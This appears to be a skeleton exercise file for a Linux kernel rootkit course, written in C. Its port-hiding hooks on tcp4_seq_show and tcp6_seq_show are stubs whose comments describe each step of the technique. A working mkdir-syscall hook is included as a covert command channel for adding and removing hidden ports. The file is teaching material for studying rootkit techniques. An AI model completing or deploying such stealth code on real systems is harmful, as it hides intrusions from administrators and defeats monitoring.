// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64
#define SEQ_START_TOKEN ((void *)1)

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list port_targets;

/* TODO: Implement rk_target_add(list, name)
 * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
 */
static int rk_target_add(struct rk_target_list *list, const char *name)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement rk_target_remove(list, idx)
 * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
 */
static int rk_target_remove(struct rk_target_list *list, int idx)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement rk_target_match(list, name)
 * spin_lock_irqsave, iterate and strcmp, return true/false, spin_unlock_irqrestore
 */

/* ---- tcp seq_show interception ---- */

struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

/* TODO: Implement tcp_show_entry(ri, regs)
 * tcp4_seq_show is a regular function, not a syscall wrapper.
 * Get seq_file pointer from regs->di, save seq->count.
 * Get sock pointer from regs->si, save it.
 */
static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

/* TODO: Implement tcp_show_return(ri, regs)
 * If sk == SEQ_START_TOKEN, skip (this is the header row).
 * Get inet_sock with inet_sk(sk).
 * Extract source port: ntohs(inet->inet_sport).
 * Convert port to string with snprintf.
 * If rk_target_match finds the port: restore seq->count to saved value.
 */
static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

static struct kretprobe tcp4_probe = {
	.handler        = tcp_show_return,
	.entry_handler  = tcp_show_entry,
	.data_size      = sizeof(struct tcp_show_data),
	.maxactive      = 20,
	.kp.symbol_name = "tcp4_seq_show",
};

static struct kretprobe tcp6_probe = {
	.handler        = tcp_show_return,
	.entry_handler  = tcp_show_entry,
	.data_size      = sizeof(struct tcp_show_data),
	.maxactive      = 20,
	.kp.symbol_name = "tcp6_seq_show",
};

/* ---- mkdir command dispatcher (provided) ---- */

static int rk_dispatch(const char *name)
{
	int idx;

	if (strncmp(name, "h.p.", 4) == 0)
		return rk_target_add(&port_targets, name + 4);
	if (strncmp(name, "u.p.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&port_targets, idx);
		return -EINVAL;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;

	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&port_targets.lock);

	/* TODO: Register tcp4_probe. */
	/* TODO: Register tcp6_probe. On failure, unregister tcp4_probe. */
	/* TODO: Register mkdir probe. On failure, unregister both tcp probes. */

	return 0;
}

static void __exit rk_exit(void)
{
	/* TODO: Unregister mkdir, tcp6, then tcp4 probes (reverse order). */
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings port filter");
